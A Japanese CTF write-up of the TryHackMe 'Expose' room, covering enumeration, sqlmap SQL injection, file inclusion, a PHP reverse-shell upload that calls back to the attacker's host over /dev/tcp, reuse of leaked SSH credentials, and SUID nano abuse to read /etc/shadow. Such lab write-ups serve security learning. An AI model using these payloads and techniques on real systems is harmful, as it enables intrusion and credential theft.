# Expose CTF

https://tryhackme.com/room/expose

## Enumeration

### ポートスキャン

```shell
10.10.199.72

root@ip-10-10-43-207:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-04 04:59 GMT
Nmap scan report for 10.10.199.72
Host is up (0.0079s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
53/tcp   open  domain
1337/tcp open  waste
1883/tcp open  mqtt
MAC Address: 02:E1:54:76:B7:7F (Unknown)

root@ip-10-10-43-207:~# sudo nmap -sV -p21,22,53,1337,1883 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-04 05:00 GMT
Nmap scan report for 10.10.199.72
Host is up (0.0017s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
1883/tcp open  mqtt
MAC Address: 02:E1:54:76:B7:7F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

FTP, SSH, DNS, HTTP, MQTT

### gobuster

```shell
root@ip-10-10-43-207:~# gobuster dir -x=txt,php -u http://$TARGET:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.199.72:1337
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/admin                (Status: 301) [Size: 319] [--> http://10.10.199.72:1337/admin/]
/index.php            (Status: 200) [Size: 91]
/phpmyadmin           (Status: 301) [Size: 324] [--> http://10.10.199.72:1337/phpmyadmin/]
/server-status        (Status: 403) [Size: 279]
/50403000000040a0102700000010f5402000000010a0a0240303030363236593130000001016a02057b60000001037a0e016d616a7f6e6d22756e647d257b60000001047.php (Status: 414) [Size: 356]
/50403000000050a0a037f657e64647271636b600000010d6a0104700000010f5a0904747032333432313530000001036a02057370000001037a0403786f6070000001047.php (Status: 414) [Size: 356]
/50403000000040a0102700000010f5402000000010a0a0240303030363236593130000001016a02057b60000001037a0e016d616a7f6e6d22756e647d257b60000001047.txt (Status: 414) [Size: 356]
/50403000000050a0a037f657e64647271636b600000010d6a0104700000010f5a0904747032333432313530000001036a02057370000001037a0403786f6070000001047.txt (Status: 414) [Size: 356]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

### FTP

```
$ ftp 10.10.199.72
Connected to 10.10.199.72.
220 Welcome to the Expose Web Challenge.
Name (10.10.199.72:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||19432|)
150 Here comes the directory listing.
226 Directory send OK.
```

anonymous でログインできるが、中身は無い。

### dirsearch

```shell
$ dirsearch -u http://10.10.199.72:1337
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_10.10.199.72_1337/_25-02-04_00-15-32.txt

Target: http://10.10.199.72:1337/

[00:15:32] Starting:
[00:15:44] 403 -  279B  - /.ht_wsr.txt
[00:15:45] 403 -  279B  - /.htaccess.bak1
[00:15:45] 403 -  279B  - /.htaccess.orig
[00:15:45] 403 -  279B  - /.htaccess.sample
[00:15:45] 403 -  279B  - /.htaccess.save
[00:15:45] 403 -  279B  - /.htaccess_orig
[00:15:45] 403 -  279B  - /.htaccess_extra
[00:15:45] 403 -  279B  - /.htaccess_sc
[00:15:45] 403 -  279B  - /.htaccessOLD2
[00:15:45] 403 -  279B  - /.htaccessBAK
[00:15:45] 403 -  279B  - /.htaccessOLD
[00:15:45] 403 -  279B  - /.html
[00:15:45] 403 -  279B  - /.htm
[00:15:45] 403 -  279B  - /.htpasswds
[00:15:45] 403 -  279B  - /.htpasswd_test
[00:15:45] 403 -  279B  - /.httr-oauth
[00:15:49] 403 -  279B  - /.php
[00:16:04] 301 -  319B  - /admin  ->  http://10.10.199.72:1337/admin/
[00:16:06] 200 -  693B  - /admin/
[00:16:07] 200 -  693B  - /admin/index.php
[00:16:09] 301 -  323B  - /admin_101  ->  http://10.10.199.72:1337/admin_101/
[00:17:02] 301 -  324B  - /javascript  ->  http://10.10.199.72:1337/javascript/
[00:17:20] 301 -  324B  - /phpmyadmin  ->  http://10.10.199.72:1337/phpmyadmin/
[00:17:23] 200 -    3KB - /phpmyadmin/doc/html/index.html
[00:17:25] 200 -    3KB - /phpmyadmin/index.php
[00:17:25] 200 -    3KB - /phpmyadmin/
[00:17:33] 403 -  279B  - /server-status
[00:17:33] 403 -  279B  - /server-status/
[00:17:56] 414 -  356B  - /wps/contenthandler/!ut/p/digest!8skKFbWr_TwcZcvoc9Dn3g/?uri=http://www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com

Task Completed
```

## ログイン画面

http://10.10.199.72:1337/admin/index.php はダミー。

http://10.10.199.72:1337/admin_101/ が本当のログイン画面と思われる。

```http
POST /admin_101/includes/user_login.php HTTP/1.1
Host: 10.10.199.72:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 36
Origin: http://10.10.199.72:1337
Connection: keep-alive
Referer: http://10.10.199.72:1337/admin_101/
Cookie: PHPSESSID=lfam149vv8q8ct03i4msqgpu1f

email=hacker%40root.thm&password=bbb


HTTP/1.1 200 OK
Date: Tue, 04 Feb 2025 05:23:14 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 111
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'hacker@root.thm'"
    ]
}
```

あからさまに email パラメータに SQLi 脆弱性がある。

## sqlmap

```shell
$ sqlmap -u "http://10.10.199.72:1337/admin_101/includes/user_login.php" \
--method POST \
--data "email=aaa&password=bbb" \
--cookie "PHPSESSID=lfam149vv8q8ct03i4msqgpu1f" \
-p "email" -a

[01:40:06] [INFO] fetching columns for table 'config' in database 'expose'
[01:40:07] [INFO] retrieved: 'id'
[01:40:08] [INFO] retrieved: 'int'
[01:40:08] [INFO] retrieved: 'url'
[01:40:08] [INFO] retrieved: 'text'
[01:40:09] [INFO] retrieved: 'password'
[01:40:09] [INFO] retrieved: 'text'
[01:40:09] [INFO] fetching entries for table 'config' in database 'expose'
[01:40:10] [INFO] retrieved: '/file1010111/index.php'
[01:40:10] [INFO] retrieved: '1'
[01:40:10] [INFO] retrieved: '69c66901194a6486176e81f5945b8929'
[01:40:11] [INFO] retrieved: '/upload-cv00101011/index.php'
[01:40:11] [INFO] retrieved: '3'
[01:40:12] [INFO] retrieved: '// ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z'
[01:40:12] [INFO] recognized possible password hashes in column 'password'
[01:40:12] [INFO] writing hashes to a temporary file '/tmp/sqlmape55sfske265845/sqlmaphashes-nln7ezrz.txt'

Database: expose
Table: config
[2 entries]
+----+------------------------------+-----------------------------------------------------+
| id | url                          | password                                            |
+----+------------------------------+-----------------------------------------------------+
| 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929                    |
| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
+----+------------------------------+-----------------------------------------------------+

[01:41:30] [INFO] table 'expose.config' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.199.72/dump/expose/config.csv'
[01:41:30] [INFO] fetching columns for table 'user' in database 'expose'
[01:41:30] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[01:41:31] [INFO] retrieved: 'id'
[01:41:31] [INFO] retrieved: 'int'
[01:41:32] [INFO] retrieved: 'email'
[01:41:32] [INFO] retrieved: 'varchar(512)'
[01:41:32] [INFO] retrieved: 'password'
[01:41:33] [INFO] retrieved: 'varchar(512)'
[01:41:33] [INFO] retrieved: 'created'
[01:41:34] [INFO] retrieved: 'timestamp'
[01:41:34] [INFO] fetching entries for table 'user' in database 'expose'
[01:41:34] [INFO] retrieved: '2023-02-21 09:05:46'
[01:41:35] [INFO] retrieved: 'hacker@root.thm'
[01:41:35] [INFO] retrieved: '1'
[01:41:35] [INFO] retrieved: 'VeryDifficultPassword!!#@#@!#!@#1231'
Database: expose
Table: user
[1 entry]
+----+-----------------+---------------------+--------------------------------------+
| id | email           | created             | password                             |
+----+-----------------+---------------------+--------------------------------------+
| 1  | hacker@root.thm | 2023-02-21 09:05:46 | VeryDifficultPassword!!#@#@!#!@#1231 |
+----+-----------------+---------------------+--------------------------------------+

[01:41:35] [INFO] table 'expose.`user`' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.199.72/dump/expose/user.csv'
```

http://10.10.199.72:1337/admin_101/ で、「VeryDifficultPassword!!#@#@!#!@#1231」のパスワードを使ったら chat.php に転送された。

http://10.10.199.72:1337/admin_101/chat.php

表示されている内容は空。

### /file1010111/index.php

69c66901194a6486176e81f5945b8929 に対応する PW の「easytohack」を入力。

URL はそのまま。

```text
Parameter Fuzzing is also important :) or Can you hide DOM elements?

<span  style="display: none;">Hint: Try file or view as GET parameters?</span>
```

#### ファイルインクルージョン

http://10.10.199.72:1337/file1010111/index.php?file=/etc/passwd

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
zeamkish:x:1001:1001:Zeam Kish,1,1,:/home/zeamkish:/bin/bash
ftp:x:114:121:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
bind:x:115:122::/var/cache/bind:/usr/sbin/nologin
Debian-snmp:x:116:123::/var/lib/snmp:/bin/false
redis:x:117:124::/var/lib/redis:/usr/sbin/nologin
mosquitto:x:118:125::/var/lib/mosquitto:/usr/sbin/nologin
fwupd-refresh:x:119:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
```

めぼしいのは、ubuntu, zeamkish の 2 ユーザー。

## /upload-cv00101011/index.php

パスワードとして「zeamkish」を入力したらログインできた。

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.2.22.182/6666 0>&1'") ?>
```

拡張子を .php.png にしたらアップロードできた。

```html
<h1>
  File uploaded successfully! Maybe look in source code to see the path<span
    style=" display: none;"
    >in /upload_thm_1001 folder</span
  >
  <h1></h1>
</h1>
```

/upload-cv00101011/upload_thm_1001/shell.php.png

にアクセスするが、PNG 表示エラーとなるだけで実行されなかった。

index.php の応答で、拡張子 php を許容するように javascript を書き換えたら、shell.php をアップロードできた。

/upload-cv00101011/upload_thm_1001/shell.php

```shell
$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.199.72] 59924
bash: cannot set terminal process group (783): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-10-199-72:/var/www/html/upload-cv00101011/upload_thm_1001$
```

リバースシェル取得成功。

```shell
<d-cv00101011/upload_thm_1001$ ls -al /home/zeamkish
total 36
drwxr-xr-x 3 zeamkish zeamkish 4096 Jul  6  2023 .
drwxr-xr-x 4 root     root     4096 Jun 30  2023 ..
-rw-rw-r-- 1 zeamkish zeamkish    5 Jul  6  2023 .bash_history
-rw-r--r-- 1 zeamkish zeamkish  220 Jun  8  2023 .bash_logout
-rw-r--r-- 1 zeamkish zeamkish 3771 Jun  8  2023 .bashrc
drwx------ 2 zeamkish zeamkish 4096 Jun  8  2023 .cache
-rw-r--r-- 1 zeamkish zeamkish  807 Jun  8  2023 .profile
-rw-r----- 1 zeamkish zeamkish   27 Jun  8  2023 flag.txt
-rw-rw-r-- 1 root     zeamkish   34 Jun 11  2023 ssh_creds.txt
www-data@ip-10-10-199-72:/var/www/html/upload-cv00101011/upload_thm_1001$ ls -al /home/ubuntu

<oad-cv00101011/upload_thm_1001$ ls -al /home/ubuntu
total 52
drwxr-xr-x  8 ubuntu ubuntu 4096 Jul  6  2023 .
drwxr-xr-x  4 root   root   4096 Jun 30  2023 ..
-rw-------  1 ubuntu ubuntu   78 Sep  5  2023 .bash_history
-rw-r--r--  1 ubuntu ubuntu  220 Feb 25  2020 .bash_logout
-rw-r--r--  1 ubuntu ubuntu 3771 Feb 25  2020 .bashrc
drwx------  2 ubuntu ubuntu 4096 May 25  2023 .cache
drwx------  3 ubuntu ubuntu 4096 Jun  2  2023 .config
drwxrwxr-x  3 ubuntu ubuntu 4096 Jun  2  2023 .local
drwxrwxr-x  6 ubuntu ubuntu 4096 Jun  2  2023 .npm
-rw-r--r--  1 ubuntu ubuntu  807 Feb 25  2020 .profile
drwx------  2 ubuntu ubuntu 4096 Jun  8  2023 .ssh
-rw-r--r--  1 ubuntu ubuntu    0 May 25  2023 .sudo_as_admin_successful
-rw-rw-r--  1 ubuntu ubuntu  209 Jun  8  2023 .wget-hsts
drwxrwxr-x 11 ubuntu ubuntu 4096 Jun  8  2023 sqlmap
```

zeamkish になってフラグを読むのが次の目標。

## 権限昇格１

```shell
www-data@ip-10-10-199-72:/var/www/html/upload-cv00101011/upload_thm_1001$ cat /home/zeamkish/ssh_creds.txt
<1/upload_thm_1001$ cat /home/zeamkish/ssh_creds.txt
SSH CREDS
zeamkish
easytohack@123
```

そのまま SSH 接続情報が置いてあった。

```shell
$ ssh zeamkish@10.10.199.72

zeamkish@ip-10-10-199-72:~$ cat flag.txt
THM{.......}
```

フラグ 1 ゲット。

次は、直接 root を目指すのか、ubuntu を挟むのか？

## 権限昇格２

実行中のサービス

```shell
zeamkish@ip-10-10-199-72:~$ systemctl list-units --type=service --state=running
  UNIT                                           LOAD   ACTIVE SUB     DESCRIPTION                                 >
  accounts-daemon.service                        loaded active running Accounts Service                            >
  acpid.service                                  loaded active running ACPI event daemon                           >
  apache2.service                                loaded active running The Apache HTTP Server                      >
  atd.service                                    loaded active running Deferred execution scheduler                >
  badr.service                                   loaded active running My startup script                           >
  cron.service                                   loaded active running Regular background program processing daemon>
  dbus.service                                   loaded active running D-Bus System Message Bus                    >
  getty@tty1.service                             loaded active running Getty on tty1                               >
  irqbalance.service                             loaded active running irqbalance daemon                           >
  ModemManager.service                           loaded active running Modem Manager                               >
  mosquitto.service                              loaded active running Mosquitto MQTT v3.1/v3.1.1 Broker           >
  multipathd.service                             loaded active running Device-Mapper Multipath Device Controller   >
  mysql.service                                  loaded active running MySQL Community Server                      >
  named.service                                  loaded active running BIND Domain Name Server                     >
  networkd-dispatcher.service                    loaded active running Dispatcher daemon for systemd-networkd      >
  polkit.service                                 loaded active running Authorization Manager                       >
  redis-server.service                           loaded active running Advanced key-value store                    >
  rsyslog.service                                loaded active running System Logging Service                      >
  serial-getty@ttyS0.service                     loaded active running Serial Getty on ttyS0                       >
  snap.amazon-ssm-agent.amazon-ssm-agent.service loaded active running Service for snap application amazon-ssm-agen>
  snapd.service                                  loaded active running Snap Daemon                                 >
  snmpd.service                                  loaded active running Simple Network Management Protocol (SNMP) Da>
  ssh.service                                    loaded active running OpenBSD Secure Shell server                 >
  systemd-journald.service                       loaded active running Journal Service                             >
  systemd-logind.service                         loaded active running Login Service                               >
  systemd-networkd.service                       loaded active running Network Service                             >
  systemd-resolved.service                       loaded active running Network Name Resolution                     >
  systemd-timesyncd.service                      loaded active running Network Time Synchronization                >
  systemd-udevd.service                          loaded active running udev Kernel Device Manager                  >
  udisks2.service                                loaded active running Disk Manager                                >
  unattended-upgrades.service                    loaded active running Unattended Upgrades Shutdown                >
  user@1001.service                              loaded active running User Manager for UID 1001                   >
  vsftpd.service                                 loaded active running vsftpd FTP server
```

Mosquitto MQTT v3.1/v3.1.1 Broker が最も怪しいと感じたが、使えそうな脆弱性は無かった。

redis-server.service に注目。

```shell
zeamkish@ip-10-10-199-72:~$ ss -tulnp
Netid    State     Recv-Q    Send-Q                        Local Address:Port        Peer Address:Port   Process
udp      UNCONN    0         0                              10.10.199.72:53               0.0.0.0:*
udp      UNCONN    0         0                              10.10.199.72:53               0.0.0.0:*
udp      UNCONN    0         0                                 127.0.0.1:53               0.0.0.0:*
udp      UNCONN    0         0                                 127.0.0.1:53               0.0.0.0:*
udp      UNCONN    0         0                             127.0.0.53%lo:53               0.0.0.0:*
udp      UNCONN    0         0                         10.10.199.72%eth0:68               0.0.0.0:*
udp      UNCONN    0         0                                 127.0.0.1:161              0.0.0.0:*
udp      UNCONN    0         0                                     [::1]:53                  [::]:*
udp      UNCONN    0         0            [fe80::e1:54ff:fe76:b77f]%eth0:53                  [::]:*
udp      UNCONN    0         0                                     [::1]:53                  [::]:*
udp      UNCONN    0         0            [fe80::e1:54ff:fe76:b77f]%eth0:53                  [::]:*
udp      UNCONN    0         0                                     [::1]:161                 [::]:*
tcp      LISTEN    0         511                               127.0.0.1:1111             0.0.0.0:*
tcp      LISTEN    0         4096                              127.0.0.1:953              0.0.0.0:*
tcp      LISTEN    0         100                                 0.0.0.0:1883             0.0.0.0:*
tcp      LISTEN    0         70                                127.0.0.1:33060            0.0.0.0:*
tcp      LISTEN    0         151                               127.0.0.1:3306             0.0.0.0:*
tcp      LISTEN    0         10                             10.10.199.72:53               0.0.0.0:*
tcp      LISTEN    0         10                                127.0.0.1:53               0.0.0.0:*
tcp      LISTEN    0         4096                          127.0.0.53%lo:53               0.0.0.0:*
tcp      LISTEN    0         128                                 0.0.0.0:22               0.0.0.0:*
tcp      LISTEN    0         511                                   [::1]:1111                [::]:*
tcp      LISTEN    0         511                                       *:1337                   *:*
tcp      LISTEN    0         4096                                  [::1]:953                 [::]:*
tcp      LISTEN    0         100                                    [::]:1883                [::]:*
tcp      LISTEN    0         10           [fe80::e1:54ff:fe76:b77f]%eth0:53                  [::]:*
tcp      LISTEN    0         10                                    [::1]:53                  [::]:*
tcp      LISTEN    0         32                                        *:21                     *:*
tcp      LISTEN    0         128                                    [::]:22                  [::]:*
```

どのポートか分からないので手あたり次第。

```shell
zeamkish@ip-10-10-199-72:~$ redis-cli -p 1111
127.0.0.1:1111> ping
PONG
127.0.0.1:1111>
```

1111 ポートだった。しかし、

```shell
127.0.0.1:1111[1]> keys *
(empty list or set)
```

何も入ってなさそう。

```shell
     2136    316 -rwsr-xr-x   1 root     root              320136 Apr 10  2020 /usr/bin/nano
```

nano に SUID が付いていることを見落としていた。

```shell
nano /etc/shadow
```

shadow。

```text
root:$6$XW4VBdzLEmOQNIVM$73YVhXQ6I6Vks5z4ZOmNByplc0ddZ.5jlUL1z8g2cJcVYY38AeFkxe.ukqnYiU5SZRHoeggPdLUnP/zbDj96X/:195>
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
uucp:*:18561:0:99999:7:::
proxy:*:18561:0:99999:7:::
www-data:*:18561:0:99999:7:::
backup:*:18561:0:99999:7:::
list:*:18561:0:99999:7:::
irc:*:18561:0:99999:7:::
gnats:*:18561:0:99999:7:::
nobody:*:18561:0:99999:7:::
systemd-network:*:18561:0:99999:7:::
systemd-resolve:*:18561:0:99999:7:::
systemd-timesync:*:18561:0:99999:7:::
messagebus:*:18561:0:99999:7:::
syslog:*:18561:0:99999:7:::
_apt:*:18561:0:99999:7:::
tss:*:18561:0:99999:7:::
uuidd:*:18561:0:99999:7:::
tcpdump:*:18561:0:99999:7:::
sshd:*:18561:0:99999:7:::
landscape:*:18561:0:99999:7:::
pollinate:*:18561:0:99999:7:::
ec2-instance-connect:!:18561:0:99999:7:::
systemd-coredump:!!:19502::::::
ubuntu:!$6$K29Hi7uuGmlOHdlN$7VvcUkUlHSfxEXDbjMXeuyLVBy8CCiHkqLB2NMOHu1hWp.BiVvLUfPwTCwZg9AeUfwOEMbhiNwWLqGLD0KQpu/:>
lxd:!:19502::::::
mysql:!:19502:0:99999:7:::
zeamkish:$6$DQwXomZM9D.u32BV$hcRpprysYgTxXCcet9BeGov5N.TtMgDCYJfPfdD6Ota6rF/Sm8lfRwh590E81CKKexLzH92gzdRE3tM2V2G5I.>
ftp:*:19519:0:99999:7:::
bind:*:19523:0:99999:7:::
Debian-snmp:!:19523:0:99999:7:::
redis:*:19523:0:99999:7:::
mosquitto:*:19523:0:99999:7:::
fwupd-refresh:*:19544:0:99999:7:::
```

少しだけブルートフォースを試したが割れなかった。

/root/root.txt はアクセス権限がないというエラー。

/root/flag.txt でアクセスできた。

```text
THM{......}
```

## 振り返り

- 驚いたのは、sqlmap でテーブル内のデータが出てきたこと。ブラインドインジェクションだと思ったが、どういう理屈であんなにデータを取得できたのか、深堀りが必要。
- nano の SUID に長いこと気付かなかったのが痛かった。数日前に「SUID の結果は精査しなければならない」と反省したばかりだったのに。
- nano でテキストファイルを作ったときに root オーナーになっていたときに強い違和感を持ったが、掘り下げていなかった。
- そのおかげで、redis を初めて触ることができたことは怪我の功名。

### 検証：なぜ sqlmap はデータを取得できたのか？

ブラインドインジェクションなので、テーブル名と列名が出てきたら御の字と思って実行してみたら、大量のデータが出てきたのが非常に意外だった。

→ 　 SQL エラーが発生したときエラー内容がそのまま応答に含まれていたため、テーブル名や列名などは簡単に露出、さらに駆使して内部データまで露出していたと思われる。
